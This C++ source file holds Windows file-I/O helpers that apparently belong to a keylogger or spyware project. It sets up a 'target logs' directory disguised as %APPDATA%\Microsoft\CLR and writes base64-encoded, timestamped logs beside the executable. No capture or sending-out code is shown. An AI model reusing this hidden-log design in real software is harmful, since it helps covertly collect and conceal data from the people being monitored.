#include <string>
#include <cstdlib>
#include <windows.h>
#include <stdio.h>
#include <fstream>
#include <sstream>
#include "Helper.h"
#include "Encryption.h"
#include "IO.h"

namespace IO
{

    std::string GetTargetLogsDirPath(const bool append_seperator)
    {
        std::string appdataDir(getenv("APPDATA"));
        std::string full = appdataDir + "\\Microsoft\\CLR";
        return full + (append_seperator ? "\\" : "");
    }

    bool MakeOneDirectory( std::string path )
    {
        return (bool)CreateDirectory(path.c_str(), NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS;
    }

    bool DeleteFile( const std::string &f )
    {
        if (remove(f.c_str()) == 0)
            return true; // if succesful
        else
            return false; // if not succesful
    }

    bool MKDir( std::string path)
    {
        for (char &c : path)
        {
            if( c == '\\' )
            {
                c = '\0';
                if (!MakeOneDirectory(path))
                    return false;
                c = '\\';
            }
        }
        return true;
    }

    bool CheckFileExists(const std::string &f)
    {
        std::ifstream file(f);
        return (bool)file;
    }

    bool CheckDirExists(const std::string &dir)
    {
        DWORD ftype = GetFileAttributes(dir.c_str());
        long l = GetLastError();
        if (l == ERROR_PATH_NOT_FOUND)
            return false;
        else
            return true;
    }


    std::string lastLogFileFullPath = "";
    bool logWriteSuccess = false;

    std::string GetLastLogPath()
    {
        return lastLogFileFullPath;
    }

    bool GetLogWriteSuccess()
    {
        return logWriteSuccess;
    }

    void testWrite()
    {
        std::ofstream outFile;
        outFile.open(IO::GetCurDir() + "\\hmm.txt", std::ios::app);
        std::string testString = "hello darkness my old friend";
        outFile << testString.c_str() << std::endl << "\n";
        outFile.close();
    }

    void WriteLog( const std::string &s )
    {
        std::ofstream logFile;
        if (!logFile)
        {
            lastLogFileFullPath = "";
            logWriteSuccess = false;
            logFile.close();
            return;
        }

        std::ostringstream oStrm;
        oStrm << "[" << Helper::DateTime().GetDateTimeString(":", " | ") << "]"
                << "\n\n"
                << s << std::endl
                << "\n";

        std::string encodedString = Encryption::EncryptB64(oStrm.str());
        logFile.open(IO::GetCurDir() + "\\app.log", std::ios::app);
        logFile << encodedString << std::flush;

        if (!logFile)
        {
            lastLogFileFullPath = "";
            logWriteSuccess = false;
            logFile.close();
            return;
        }
        
        // Succesful
        lastLogFileFullPath = IO::GetCurDir() + "\\app.log";
        logWriteSuccess = true;
        logFile.close();
        return;
    }

    void WriteDebugAppLog(const std::string &s)
    {
        std::ofstream outfile;
        outfile.open(IO::GetCurDir() + "\\ERROR_README.txt", std::ios::app);
        outfile << "[" << Helper::DateTime().GetDateTimeString(":", " | ") << "]"
                << "\n"
                << s << std::endl
                << "\n";
        outfile.close();
    }



    std::string GetThisFilePath()
    {
        char ownPath[MAX_PATH];
        HMODULE hModule = GetModuleHandle(NULL);
        if ( hModule != NULL )
        {
            GetModuleFileName( hModule, ownPath, (sizeof(ownPath)) );
            return std::string(ownPath);
        }
        else
            return "";
    }

    std::string GetCurDir()
    {
        std::string curDir = GetThisFilePath();           // Still has \\filename after it so delete
        curDir = curDir.erase(curDir.find_last_of("\\")); // Delete \\filename from string
        return curDir;
    }


} // IO